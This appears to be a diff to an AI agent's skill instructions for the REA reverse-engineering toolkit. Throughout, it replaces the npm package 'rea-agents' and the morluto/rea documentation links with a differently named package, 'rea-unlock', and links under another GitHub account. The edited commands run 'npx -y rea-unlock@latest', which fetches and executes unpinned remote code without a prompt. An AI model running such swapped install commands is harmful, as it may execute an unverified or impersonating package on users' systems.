@@ -33,7 +33,7 @@ availability have different remedies; avoid repeating setup for all of them.
 
 1. Diagnose without changing REA or client configuration. `npx` may download
    the package and write to npm's cache. For Codex, run
-   `npx -y rea-agents@latest doctor --client codex --json`. Substitute the current
+   `npx -y rea-unlock@latest doctor --client codex --json`. Substitute the current
    supported client: `claude_code`, `claude_desktop`, `codex`, `cursor`,
    `gemini_cli`, `windsurf`, `devin`, `opencode`, `antigravity`, `copilot_cli`,
    `commandcode`, `vscode`, `grok_build`, `omp`, or `grok_bot`. `grok_bot` has no local
@@ -47,12 +47,12 @@ availability have different remedies; avoid repeating setup for all of them.
    that provider: static JavaScript inspection needs neither Hopper nor Ghidra,
    and Android inspection has separate bring-your-own JADX/Java prerequisites.
 3. For a configuration repair, prepare the read-only plan:
-   `npx -y rea-agents@latest setup --client codex --dry-run --json`.
+   `npx -y rea-unlock@latest setup --client codex --dry-run --json`.
    Use the current client's ID, show its exact proposed paths, backups, and
    changes, and obtain approval before setup writes configuration or installs
    Hopper. Setup normally installs the matching bundled skill too; include that
    replacement in the reviewed plan. After approval, apply the same scope with
-   `npx -y rea-agents@latest setup --client codex --yes`. Add `--install-hopper`
+   `npx -y rea-unlock@latest setup --client codex --yes`. Add `--install-hopper`
    only if that separate installation was needed and explicitly approved.
 4. Restart/reconnect the affected agent. Verify that REA tools actually appear
    in the session, then resume the original investigation. If they remain
@@ -62,12 +62,12 @@ REA setup never installs or upgrades Node.js, npm, Homebrew, Java, Ghidra, IDA,
 JADX, Binwalk, or Unblob. Use existing prerequisites; do not install unrelated
 software to repair
 MCP registration. For an unsupported client, use manual stdio registration
-with a version-pinned `rea-agents` package or continue through the CLI.
+with a version-pinned `rea-unlock` package or continue through the CLI.
 
 A concrete CLI fallback for an operator-supplied JavaScript tree or ASAR is:
 
 ```bash
-npx -y rea-agents@latest analyze-javascript-application /absolute/path/to/app --json
+npx -y rea-unlock@latest analyze-javascript-application /absolute/path/to/app --json
 ```
 
 No MCP registration or native engine is required. Read the returned Evidence,
@@ -75,7 +75,7 @@ graph, limitations, and unknowns with the same care as an MCP result; the CLI
 returns the Evidence record directly. This fallback does not establish that
 MCP is configured. Native CLI tasks still require their selected engine.
 Prefer an existing `rea` CLI. When none is installed and REA package acquisition
-is within the authorized scope, use `npx -y rea-agents@latest` in its place.
+is within the authorized scope, use `npx -y rea-unlock@latest` in its place.
 Configuration repair starts with a read-only setup plan; show paths, backups and
 skill replacement before applying authorized changes. Preserve existing approval
 and target-execution boundaries. REA setup never installs or upgrades unrelated
@@ -99,7 +99,7 @@ explicit path or endpoint and do not need it.
 - Firmware image: `inspect_firmware_regions` when advertised. Use
   `extract_firmware` when extraction is requested, with a caller-selected new
   absolute output directory. These tools use caller-supplied Binwalk/Unblob on
-  Linux; see the [firmware guide](https://github.com/morluto/rea/blob/main/docs/firmware-analysis.md).
+  Linux; see the [firmware guide](https://github.com/zheedevVn/Rea-Unlock/blob/main/docs/firmware-analysis.md).
 - .NET NativeAOT PE/ELF: native Ghidra analysis. Native code can yield pseudocode;
   consult the NativeAOT workflow in `references/native-and-artifacts.md` for
   optional metadata recovery and its supported host/layout boundary.
@@ -115,7 +115,7 @@ explicit path or endpoint and do not need it.
 - Retained HAR/SAZ/native mitmproxy/aioquic qlog capture: `inspect_web_network_capture`. Select
   original record ordinals when useful; inspect producer fields and byte/number
   sidecars without fetching recorded URLs or claiming live attribution. See
-  [historical captures](https://github.com/morluto/rea/blob/main/docs/web-network-captures.md) for the exact upstream
+  [historical captures](https://github.com/zheedevVn/Rea-Unlock/blob/main/docs/web-network-captures.md) for the exact upstream
   profile and credential exclusions. Qlog support starts with aioquic 1.5.0
   JSON 0.3; stream coverage and endpoint loss declarations do not recover bodies
   or establish network loss. Prefer detail summary, then kind qlog trace/stream
@@ -128,7 +128,7 @@ explicit path or endpoint and do not need it.
   Query/page the relevant records; registrations do not establish observed traffic.
 - Recorded packet captures: `inspect_packet_capture` with selected TShark fields,
   display filters and decode-as rules. Requires Linux, util-linux prlimit and `REA_TSHARK_COMMAND`; see
-  [capture guide](https://github.com/morluto/rea/blob/main/docs/packet-captures.md).
+  [capture guide](https://github.com/zheedevVn/Rea-Unlock/blob/main/docs/packet-captures.md).
   Packet limits count input packets before filtering. Output defaults to 50 matching
   frames; use `match_offset` / `match_limit` for later pages, or explicit null
   limit for complete matching output. Preserve the source digest across pages.
@@ -136,7 +136,7 @@ explicit path or endpoint and do not need it.
   For address/DNS/SNI/protocol summaries use `inspect_pcap_capture` with MCP
   detail summary, then retained kind pcap pages. Requires Wireshark 4.x tshark
   and capinfos, with Linux prlimit or Windows Job Objects; see
-  [packet summaries](https://github.com/morluto/rea/blob/main/docs/pcap-analysis.md).
+  [packet summaries](https://github.com/zheedevVn/Rea-Unlock/blob/main/docs/pcap-analysis.md).
   Select an exact DNS question for address pages; page exhaustion does not prove
   network completeness. This reads recordings and does not acquire traffic.
 - Decoder discovery: `inspect_signal_decoders` searches installed decoder IDs
@@ -144,7 +144,7 @@ explicit path or endpoint and do not need it.
   relevant details before choosing settings; this does not scan hardware.
 - Recorded logic/signal traces: `decode_signal_recording` with explicit decoder,
   channel and protocol settings. On Linux with util-linux prlimit, supply sigrok-cli 0.7.2 through
-  `REA_SIGROK_COMMAND`; see [recording guide](https://github.com/morluto/rea/blob/main/docs/signal-recordings.md).
+  `REA_SIGROK_COMMAND`; see [recording guide](https://github.com/zheedevVn/Rea-Unlock/blob/main/docs/signal-recordings.md).
   Output defaults to 50 literal lines; select annotation classes and page with
   `line_offset` / `line_limit`, or explicit null for all remaining output.
   Window counts are display lines, not annotations or samples. Preserve source digests across pages.
@@ -153,7 +153,7 @@ explicit path or endpoint and do not need it.
   through `REA_WABT_BIN_DIRECTORY`; retain exact byte/tool identity and decoded WAT.
   Select JavaScript glue and candidate paths explicitly and preserve URL/path
   ambiguity. No implicit fetch or target execution; WAT is not original source.
-  See the [WASM guide](https://github.com/morluto/rea/blob/main/docs/wasm-artifacts.md).
+  See the [WASM guide](https://github.com/zheedevVn/Rea-Unlock/blob/main/docs/wasm-artifacts.md).
 - Explicit local EVM bytecode carrier: `inspect_evm_interface` with caller-selected
   `raw` or `hex` encoding. Preserve carrier/decoded digests and treat selectors,
   argument strings and mutability as inferred candidates; this performs no chain
@@ -162,13 +162,13 @@ explicit path or endpoint and do not need it.
   Evidence stays retained under its original identity. Use the returned
   `parent_evidence_id` for exact function or `bytecode_hex`/stdout/stderr pages.
   Candidate coverage does not establish interface completeness. See the
-  [EVM bytecode guide](https://github.com/morluto/rea/blob/main/docs/evm-bytecode.md).
+  [EVM bytecode guide](https://github.com/zheedevVn/Rea-Unlock/blob/main/docs/evm-bytecode.md).
 - Embedded Go compiler, module or build-setting metadata: `inspect_go_binary`
   with the explicit local file. This built-in target-free inspection requires no
   Go installation or disassembler. Preserve raw module bytes and source ranges;
   absent metadata does not prove a binary is not Go, and unparsed text records
   remain explicit. See the
-  [Go binary guide](https://github.com/morluto/rea/blob/main/docs/go-binaries.md).
+  [Go binary guide](https://github.com/zheedevVn/Rea-Unlock/blob/main/docs/go-binaries.md).
 - Embedded cargo-auditable Rust dependency metadata: `inspect_rust_binary`
   with the explicit local ELF, PE, or thin Mach-O file. This built-in
   target-free inspection requires no Rust installation or disassembler. Preserve
@@ -176,7 +176,7 @@ explicit path or endpoint and do not need it.
   `.dep-v0` section is null metadata, not proof the binary has no dependencies.
   A rustc commit hash is an inference from a read-only `/rustc/<40-hex>/` path.
   See the
-  [Rust binary guide](https://github.com/morluto/rea/blob/main/docs/rust-binaries.md).
+  [Rust binary guide](https://github.com/zheedevVn/Rea-Unlock/blob/main/docs/rust-binaries.md).
 
 - Explicit local SQLite database snapshot: `inspect_sqlite_database`. Inspect
   with Node.js 24.x >=24.15 or 26+ providing native SQLite limits. Read schema
@@ -185,17 +185,17 @@ explicit path or endpoint and do not need it.
   20 rows; request `schema_scope: "database"` for the complete stored schema. Preserve both database and existing sibling WAL identity; row samples
   report truncation and have unspecified order. Use a quiescent snapshot rather
   than assuming a live database/WAL pair was copied atomically. See the
-  [SQLite guide](https://github.com/morluto/rea/blob/main/docs/sqlite-databases.md).
+  [SQLite guide](https://github.com/zheedevVn/Rea-Unlock/blob/main/docs/sqlite-databases.md).
 - Explicit Linux ELF file for offline layout, symbols, relocations or static
   mitigation evidence: `inspect_binary_layout`. This target-free operation uses
   caller-supplied pwntools without opening a disassembler database. Preserve its
   raw locations and inference/coverage limits; see the
-  [offline binary guide](https://github.com/morluto/rea/blob/main/docs/binary-diagnostics.md).
+  [offline binary guide](https://github.com/zheedevVn/Rea-Unlock/blob/main/docs/binary-diagnostics.md).
 - Supplied Linux x86-64 ELF core: `inspect_recorded_crash`. Read every recorded
   thread, raw note and source-bound register without opening a live target.
   Historical PIDs do not select live processes. Request `include_debugger_context`
   only when core-only mapping candidates help; see the
-  [recorded crash guide](https://github.com/morluto/rea/blob/main/docs/recorded-crashes.md).
+  [recorded crash guide](https://github.com/zheedevVn/Rea-Unlock/blob/main/docs/recorded-crashes.md).
 - PE resource type/name/language trees and static icon group references:
   `inspect_pe_resources` with an explicit path. This portable operation requires
   no active target or engine; opaque payloads retain file ranges and SHA-256.
@@ -209,7 +209,7 @@ The legacy attached profile binds the already-open GUI input by SHA-256 and
 leaves its database open. The modern headless profile creates and closes an
 owned private database without saving. Installation and registration reuse
 [mrexodia/ida-pro-mcp](https://github.com/mrexodia/ida-pro-mcp); see the
-[IDA provider guide](https://github.com/morluto/rea/blob/main/docs/ida-provider.md).
+[IDA provider guide](https://github.com/zheedevVn/Rea-Unlock/blob/main/docs/ida-provider.md).
 Proceed directly to `analyze_function`, pseudocode, or function/string searches
 after opening; IDA does not supply `binary_overview`. Consult session availability
 when composing broader workflows. Modern direct callers and unsupported dossier
